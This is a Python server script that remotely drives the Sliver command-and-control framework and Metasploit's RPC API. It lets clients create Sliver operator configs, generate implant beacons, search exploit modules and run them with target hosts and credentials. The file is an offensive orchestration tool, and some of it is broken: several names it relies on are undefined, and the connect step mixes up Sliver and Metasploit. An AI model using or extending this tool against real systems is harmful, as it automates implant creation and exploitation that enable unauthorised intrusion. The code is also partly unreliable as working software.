import os
import time
import socket
import threading
import subprocess
import pexpect
from socket_threading import Server
import json
from pymetasploit3.msfrpc import MsfRpcClient

from socket_threading import RED, BLUE, GREEN, YELLOW, RESET

sliverInstance = None

def create_sliver_config(operator_name, lhost):
    """Create Sliver Config file"""
    print(f"{GREEN}=============== Create Sliver Config ==============={RESET}")
    try:
        sliver = pexpect.spawn("sliver-server", encoding = 'utf-8')
        sliver.expect(r"sliver", timeout=30)
        print(f"{GREEN}[+] Server Output: {RESET} {sliver.before}")

        new_operator_cmd = f"new-operator --name {operator_name} --lhost {lhost}"
        multiplayer_cmd = "multiplayer"

        sliver.sendline(new_operator_cmd)
        sliver.expect(r"sliver", timeout=30)
        print(f"{GREEN}[+] Server Output: {RESET} {sliver.before}")

        sliver.sendline(multiplayer_cmd)
        sliver.expect(r"sliver", timeout=30)
        print(f"{GREEN}[+] Server Output: {RESET} {sliver.before}")
        print(f"{GREEN}[+] Successfully created Sliver Config file{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[!] Failed to create Sliver Config file: {e}")
        return False

def create_sliver_beacon(operator_name, lhost, seconds, jitter, http, os, arch, beacon_name):
    """Create Sliver Beacon"""
    print(f"{GREEN}=============== Connect Sliver Client ==============={RESET}")
    try:
        import_config_file_command = f"sliver-client import {operator_name}_{lhost}.cfg"
        subprocess.run(import_config_file_command, shell = True, check = True)
        
        sliver = pexpect.spawn("sliver-client", encoding = 'utf-8')
        sliver.expect(r"sliver", timeout=30)
        print(f"{GREEN}[+] Client Output: {RESET} {sliver.before}")

        beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --name {beacon_name}"
        http_command = "http"

        sliver.sendline(beacon_creation_command)
        sliver.expect(r"sliver", timeout=30)
        print(f"{GREEN}[+] Client Output: {RESET} {sliver.before}")

        sliver.sendline(http_command)
        sliver.expect(r"sliver", timeout=30)
        print(f"{GREEN}[+] Client Output: {RESET} {sliver.before}")
        print(f"{GREEN}[+] Successfully created Sliver beacon{RESET}")
        return True

    except Exception as e:
        print(f"{RED}[!] Failed to connect sliver-client to sliver-server: {e}")
        return False

def connect_to_msfserver(password, server, port, max_retries=10, retry_delay=2):
    """Connect to the MSF server with retries."""
    print(f"{GREEN}=============== Starting Metasploit API ==============={RESET}")
    for attempt in range(max_retries):
        try:
            msf_client = MsfRpcClient(password, server=server, port=port)
            print(f"{GREEN}[+] Successfully connected to MSF Server!{RESET}")
            return msf_client
        except Exception as e:
            print(f"{YELLOW}[!] Failed to connect to MSF Server: {e}, RETRYING ({attempt + 1}/{max_retries}){RESET}")
            time.sleep(retry_delay)
    print(f"{RED}[!] Max retries reached. Could not connect to MSF Server.{RESET}")
    return None

def start_msfconsole_with_script(resource_script):
    """Start msfconsole with the specified resource script."""
    if not os.path.exists(resource_script):
        print(f"{RED}[!] Resource script {resource_script} not found!{RESET}")
        return False
    
    print(f"{GREEN}[+] Starting msfconsole with resource script: {resource_script}{RESET}")
    try:
        process = subprocess.Popen(
            ["msfconsole", "-r", resource_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Wait briefly and check if the process started
        time.sleep(5)  # Increased to give msfconsole time to start RPC
        if process.poll() is not None:  # Process has terminated
            stdout, stderr = process.communicate()
            print(f"{RED}[!] msfconsole failed to start: {stderr}{RESET}")
            return False
        print(f"{GREEN}[+] msfconsole started successfully! PID: {process.pid}{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[!] Error starting msfconsole: {e}{RESET}")
        return False

def connect_msf():
    if not start_msfconsole_with_script(RESOURCE_SCRIPT):
        return None
    msf_instance = connect_to_msfserver(password=MSF_PASSWORD, server=MSF_HOST, port=MSF_PORT)
    if msf_instance:
        print(f"{GREEN}[+] Registered Metasploit with name 'msf'{RESET}")
    else:
        print(f"{RED}[!] Failed to register Metasploit.{RESET}")
    return msf_instance

def search_exploit(keyword=None, start=0, count=20):
    """Search for exploits, numbering results with pagination and prompt."""
    if msfInstance is None:
        return [], 0
    exploits = msfInstance.modules.exploits
    if keyword is None:
        filtered_exploits = exploits
    else:
        filtered_exploits = [exploit for exploit in exploits if keyword.lower() in exploit.lower()]
    total = len(filtered_exploits)
    paginated_exploits = filtered_exploits[start:start + count]
    numbered_exploits = [f"{i + 1 + start}. {exploit}" for i, exploit in enumerate(paginated_exploits)]
    # Add prompt if there are more results or if we're in a search session
    if start + count < total:
        numbered_exploits.append(f"{BLUE}[SERVER] Send 'next' for next page, Send 'prev' for previous page or 'exit' to return to CLI{RESET}")
    return numbered_exploits, total

def search_auxiliary_modules(keyword=None, start=0, count=20):
    """Search for auxiliary modules with pagination."""
    if msfInstance is None:
        return [], 0
    auxiliary_modules = msfInstance.modules.auxiliary
    if keyword is None:
        filtered_auxiliary = auxiliary_modules
    else:
        filtered_auxiliary = [aux for aux in auxiliary_modules if keyword.lower() in aux.lower()]
    total = len(filtered_auxiliary)
    paginated_auxiliary = filtered_auxiliary[start:start + count]
    return paginated_auxiliary, total

def parse_param_value(opt_data, user_input):
    """
    Convert 'user_input' (string) to the correct type based on 'opt_data'.
    If the default or 'type' is bool, parse user_input -> boolean.
    If integer, parse user_input -> int.
    Otherwise, keep as string.
    """
    msf_type = opt_data.get('type', '').lower()  # e.g. "bool", "string", "port", ...
    default_val = opt_data.get('default', None)

    user_input = user_input.strip()
    if not user_input:
        return None  # signal "skip" so we rely on Metasploit’s default

    # If user typed "true"/"false", we can parse it
    if msf_type == 'bool' or isinstance(default_val, bool):
        return (user_input.lower() == 'true')
    elif msf_type == 'integer' or isinstance(default_val, int):
        return int(user_input)
    elif msf_type == 'port':
        return int(user_input)
    # If you want to handle 'float' or 'double' similarly, do so here

    # Otherwise, treat as string
    return user_input

def run_msf_exploit(mtype, mname, user_params):
    """Run the selected exploit with parameters."""
    exploit = msfInstance.modules.use(mtype, mname)
    if not exploit:
        return f"{RED}[!] Could not load {mtype} module: {mname}"

    info = exploit._info.get('options', {})
    for param_key, param_value in user_params.items():
        # param_value is the string type in the client
        # look up the official msf opt_data
        opt_data = info.get(param_key, {})
        typed_val = parse_param_value(opt_data, str(param_value))

        # If typed_val is None => user typed nothing => skip
        if typed_val is None:
            continue

        exploit[param_key] = typed_val

    print(f"{GREEN}Running exploit: {mname}{RESET}")
    result = exploit.execute()
    print(f"{BLUE}Exploit Result: {result}{RESET}")
    return result

#####################
# Validate Module 
#####################
def validate_module_type(module_type, module_name):
    """
    Optional utility:
    If the user typed 'run exploit X' but 'X' is actually an auxiliary, 
    or vice versa, we can handle that gracefully. 
    Return (bool_ok, error_message).
    """
    if module_type == "exploit":
        # Check if it exists in the exploit list
        if module_name not in msfInstance.modules.exploits:
            return False, f"{RED}{module_name} is NOT an exploit. Try: run auxiliary {module_name}{RESET}"
    elif module_type == "auxiliary":
        # Check if it exists in the auxiliary list
        if module_name not in msfInstance.modules.auxiliary:
            return False, f"{RED}{module_name} is NOT an auxiliary. Try: run exploit {module_name}{RESET}"
    return True, None

def handle_message(data, client_address):
    """Handle messages from clients."""
    global msfInstance
    print(f"{BLUE}[Server] Processing message: '{data}' from {client_address}{RESET}")
    options = data.split()
    command = options[0].lower() if options else ""

    # Static variable to track search state per client
    if not hasattr(handle_message, 'search_state'):
        handle_message.search_state = {}
    client_state = handle_message.search_state.setdefault(client_address, 
                                                          {'keyword': None, 'start': 0, 'in_search': False, 'in_run': False, 'run_module': None, 'config': False})

    if command == "create_config":
        if len(options) < 3:
            response = f"{RED}[!] Invalid Sliver config creation command: create_config [operator_name] [lhost]{RESET}"
        else: 
            response = f"{BLUE}[+] Creating Sliver Config...{RESET}"
            config = create_sliver_config(options[1], options[2])
            if config:
                response = f"{BLUE}[+] Created Sliver Config!{RESET}"
                client_state['config'] = True
            else:
                response = f"{RED}[!] Sliver config creation failed!{RESET}"

    elif command == "create_beacon": 
        if len(options) < 9:
            response = f"{RED}[!] Invalid Sliver Beacon Creation command: create_beacon [operator_name] [lhost] [seconds] [jitter] [http] [os] [arch] [beacon_name]{RESET}"
        elif not client_state['config']:
            response = f"{RED}[!] You must create a Sliver configuration file before creating a Sliver beacon{RESET}"
        else:
            response = f"{BLUE}[+] Creating Sliver Beacon...{RESET}"
            beacon = create_sliver_beacon(options[1], options[2], options[3], options[4], options[5], options[6], options[7], options[8])
            if beacon:
                response = f"{BLUE}[+] Created Sliver Beacon!{RESET}"
                client_state['beacon'] = True
            else:
                response = f"{RED}[!] Sliver beacon creation failed!{RESET}"

    elif command == "connect":
        response = f"{BLUE}[+] Connecting to Sliver...{RESET}"
        sliverInstance = connect_sliver()
        response = f"{BLUE}[+] Connected to Sliver!{RESET}" if sliverInstance else f"{RED}[-] Failed to connect to Metasploit{RESET}"
        client_state['in_search'] = False  # Reset search state on connect
        client_state['in_run'] = False
    
    elif command == "search":
        if len(options) < 3:
            response = f"{RED}[!] Invalid search command: search [exploits]/[auxiliary] [keyword] [start_index]{RESET}"
        else:
            module_type = options[1]
            keyword = options[2] if len(options) > 2 else None
            start = int(options[3]) if len(options) > 3 and options[3].isdigit() else 0

            if msfInstance is None:
                response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
            elif module_type == "exploits":
                client_state['keyword'] = keyword
                client_state['start'] = start
                client_state['in_search'] = True
                client_state['in_run'] = False
                results, total = search_exploit(keyword, start)
                if keyword:
                    response = f"{BLUE}Exploit modules matching '{keyword}' ({start}-{min(start+20, total)} of {total}):\n{RESET}" + "\n".join(results) if results else f"{BLUE}No exploit modules found for '{keyword}'.{RESET}"
                else:
                    response = f"{BLUE}All exploit modules ({start}-{min(start+20, total)} of {total}):\n{RESET}" + "\n".join(results) if results else f"{BLUE}No exploit modules available.{RESET}"
            elif module_type == "auxiliary":
                results, total = search_auxiliary_modules(keyword, start)
                if keyword:
                    response = f"{BLUE}Auxiliary modules matching '{keyword}' ({start}-{min(start+20, total)} of {total}):\n{RESET}" + "\n".join(results) if results else f"{BLUE}No auxiliary modules found for '{keyword}'.{RESET}"
                else:
                    response = f"{BLUE}All auxiliary modules ({start}-{min(start+20, total)} of {total}):\n{RESET}" + "\n".join(results) if results else f"{BLUE}No auxiliary modules available.{RESET}"
            else:
                response = f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"

    elif command == "run":
        if len(options) < 3:
            response = f"{RED}[!] Invalid run command: run [exploit]/[auxiliary] [module_name]{RESET}"
        else:
            module_type = options[1]
            module_name = options[2]
            valid_ok, err_msg = validate_module_type(module_type, module_name)

            if msfInstance is None:
                response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
            elif not valid_ok:
                response = err_msg
            else:
                exploit = msfInstance.modules.use(module_type, module_name)

                if not exploit:
                    response = f"{RED}[!] Could not load {module_type} module: {module_name}{RESET}"
                else:
                    # Hard-code any required booleans or default values you don't want to prompt for
                    exploit_info = exploit._info
                    if 'options' in exploit_info and isinstance(exploit_info['options'], dict):
                        options_dict = exploit_info['options']
                    else:
                        options_dict = {}

                    ALWAYS_PROMPT_OPTS = {"RHOSTS", "USERNAME", "PASSWORD", "THREADS", "RPORT"}

                    # Build prompt list for just these 5
                    module_options = []
                    for opt_name, opt_data in options_dict.items():
                        if opt_name in ALWAYS_PROMPT_OPTS:
                            default_val = opt_data.get('default', "")
                            desc_val    = opt_data.get('desc', "")
                            # We'll keep 'required' = False so it doesn't say "required" in the prompt
                            module_options.append({
                                'name': opt_name,
                                'required': False,
                                'default': default_val,
                                'desc': desc_val
                            })

                    # Save client_state['in_run'] as true
                    # Save options in client_state['exploit_options']
                    client_state['in_run'] = True
                    client_state['exploit_options'] = module_options
                    client_state['user_params'] = {}
                    client_state['module_type'] = module_type
                    client_state['module_name'] = module_name

                    # Query first exploit option
                    response = f"{BLUE}Please enter the {client_state['exploit_options'][0]['name']}: {RESET}"
    
    elif client_state['in_run']:
        client_state['user_params'][client_state['exploit_options'][0]['name']] = command
        client_state['exploit_options'].pop(0)
        if len(client_state['exploit_options']) == 0:
            response = json.dumps(run_msf_exploit(client_state['module_type'], client_state['module_name'], client_state['user_params']))
            client_state['in_run'] = False
            client_state['user_params'] = None
        else:
            response = f"{BLUE}Please enter the {client_state['exploit_options'][0]['name']}: {RESET}"
    
    elif command == "next" and client_state['in_search']:
        if msfInstance is None:
            response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
        else:
            client_state['start'] += 20
            results, total = search_exploit(client_state['keyword'], client_state['start'])
            if client_state['keyword']:
                response = f"{BLUE}Exploit modules matching '{client_state['keyword']}' ({client_state['start']}-{min(client_state['start']+20, total)} of {total}):\n{RESET}" + "\n".join(results) if results else f"{BLUE}No more exploit modules found for '{client_state['keyword']}'.{RESET}"
            else:
                response = f"{BLUE}All exploit modules ({client_state['start']}-{min(client_state['start']+20, total)} of {total}):\n{RESET}" + "\n".join(results) if results else f"{BLUE}No more exploit modules available.{RESET}"

    elif command == "prev" and client_state['in_search']:
        if msfInstance is None:
            response = f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
        else:
            client_state['start'] -= 20
            results, total = search_exploit(client_state['keyword'], client_state['start'])
            if client_state['keyword']:
                response = f"{BLUE}Exploit modules matching '{client_state['keyword']}' ({client_state['start']}-{min(client_state['start']+20, total)} of {total}):\n{RESET}" + "\n".join(results) if results else f"{BLUE}No more exploit modules found for '{client_state['keyword']}'.{RESET}"
            else:
                response = f"{BLUE}All exploit modules ({client_state['start']}-{min(client_state['start']+20, total)} of {total}):\n{RESET}" + "\n".join(results) if results else f"{BLUE}No more exploit modules available.{RESET}"
    
    elif command == "exit" and client_state['in_search']:
        client_state['in_search'] = False
        client_state['keyword'] = None
        client_state['start'] = 0
        response = f"{BLUE}Returned to normal CLI.{RESET}"
    
    else:
        response = f"{RED}Invalid command or not in search mode.{RESET}"

    print(f"{BLUE}[Server] Sending response to {client_address}: {response}{RESET}")
    return response

def main():
    server = Server(host='10.1.1.2', port=4444, message_handler=handle_message)
    server.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.exit()

if __name__ == "__main__":
    main()